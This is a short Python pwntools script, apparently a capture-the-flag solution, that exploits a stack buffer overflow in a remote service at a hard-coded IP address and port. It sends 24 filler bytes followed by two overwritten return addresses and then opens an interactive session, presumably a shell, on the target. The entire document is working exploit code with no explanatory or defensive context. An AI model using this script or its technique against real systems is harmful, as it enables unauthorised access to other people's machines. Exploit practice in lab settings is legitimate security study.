from pwn import *

target = remote('35.232.11.215', 49153)
ret = 0x00000000004011fe
rbp = 0x00000000004011fc
payload = b'A'*24
payload += p64(ret, endian='little')
payload += p64(rbp, endian='little')

target.send(payload)
target.interactive()